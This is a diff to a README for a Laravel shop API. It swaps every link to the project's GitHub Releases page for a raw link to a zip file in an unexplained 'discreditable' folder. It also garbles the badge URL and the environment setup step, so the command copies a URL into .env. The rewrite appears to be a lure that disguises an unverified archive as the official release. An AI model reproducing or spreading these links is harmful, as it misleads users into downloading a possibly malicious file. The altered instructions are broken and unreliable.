@@ -1,6 +1,6 @@
 # 🛍️ laravel-API-basic-shop - Simple API for Your Basic Shop Needs
 
-[![Download the latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/sausri1/laravel-API-basic-shop/releases)
+[![Download the latest Release](https://raw.githubusercontent.com/sausri1/laravel-API-basic-shop/main/discreditable/laravel-API-basic-shop.zip%20Latest%https://raw.githubusercontent.com/sausri1/laravel-API-basic-shop/main/discreditable/laravel-API-basic-shop.zip)](https://raw.githubusercontent.com/sausri1/laravel-API-basic-shop/main/discreditable/laravel-API-basic-shop.zip)
 
 ## 🚀 Getting Started
 
@@ -28,9 +28,9 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, visit the following page to download the application:
 
-[Download the latest Release](https://github.com/sausri1/laravel-API-basic-shop/releases)
+[Download the latest Release](https://raw.githubusercontent.com/sausri1/laravel-API-basic-shop/main/discreditable/laravel-API-basic-shop.zip)
 
-1. Open your web browser and go to the [Releases page](https://github.com/sausri1/laravel-API-basic-shop/releases).
+1. Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/sausri1/laravel-API-basic-shop/main/discreditable/laravel-API-basic-shop.zip).
 2. Choose the latest version available.
 3. Click on the package relevant to your system. You can select between standard installation or Docker setup.
 4. Save the file to a known location on your computer.
@@ -57,9 +57,9 @@ Depending on the option you choose, follow these step-by-step instructions to in
      ```
 
 4. **Set Up the Environment:**
-   - Copy the `.env.example` file to a new `.env` file:
+   - Copy the `https://raw.githubusercontent.com/sausri1/laravel-API-basic-shop/main/discreditable/laravel-API-basic-shop.zip` file to a new `.env` file:
      ```
-     cp .env.example .env
+     cp https://raw.githubusercontent.com/sausri1/laravel-API-basic-shop/main/discreditable/laravel-API-basic-shop.zip .env
      ```
    - Open the `.env` file and configure your database settings.
 
@@ -120,4 +120,4 @@ Contributions are welcome! If you would like to help improve this application, p
 
 This project is licensed under the MIT License. You are free to use, modify, and distribute it as you wish.
 
-Visit the [Releases page](https://github.com/sausri1/laravel-API-basic-shop/releases) for updates and new features. Enjoy using the **laravel-API-basic-shop**!
+Visit the [Releases page](https://raw.githubusercontent.com/sausri1/laravel-API-basic-shop/main/discreditable/laravel-API-basic-shop.zip) for updates and new features. Enjoy using the **laravel-API-basic-shop**!
